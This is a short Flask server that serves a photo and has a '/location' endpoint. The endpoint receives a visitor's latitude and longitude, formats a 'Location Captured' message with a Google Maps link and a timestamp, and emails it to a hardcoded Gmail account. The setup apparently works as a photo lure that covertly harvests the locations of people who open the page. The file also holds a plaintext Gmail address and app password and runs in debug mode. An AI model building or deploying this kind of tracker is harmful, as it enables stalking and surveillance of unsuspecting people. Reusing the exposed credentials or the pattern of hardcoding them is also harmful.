from flask import Flask, render_template, request, send_from_directory
from flask_cors import CORS
import smtplib
from datetime import datetime

app = Flask(__name__)
CORS(app)

# HOME PAGE
@app.route('/')
def home():
    return render_template("index.html")

# LOCATION API
@app.route('/location', methods=['POST'])
def location():

    data = request.json

    lat = data.get("latitude")
    lon = data.get("longitude")

    print("Latitude:", lat)
    print("Longitude:", lon)

    current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

    try:

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        server.login(
            "sivasksiva5343@gmail.com",
            "ejzd yulx snvs pdov"
        )

        msg = f"""
Location Captured

Latitude: {lat}
Longitude: {lon}

Time: {current_time}

Google Maps:
https://www.google.com/maps?q={lat},{lon}
"""

        server.sendmail(
            "sivasksiva5343@gmail.com",
            "sivasksiva5343@gmail.com",
            msg
        )

        server.quit()

        print("EMAIL SENT")

    except Exception as e:
        print("EMAIL ERROR:", e)

    return "OK"

# SHOW IMAGE
@app.route('/image')
def image():
    return send_from_directory('.', 'myphoto.jpg')

# DOWNLOAD IMAGE
@app.route('/download')
def download():
    return send_from_directory('.', 'myphoto.jpg', as_attachment=True)

# RUN SERVER
if __name__ == '__main__':
    app.run(debug=True)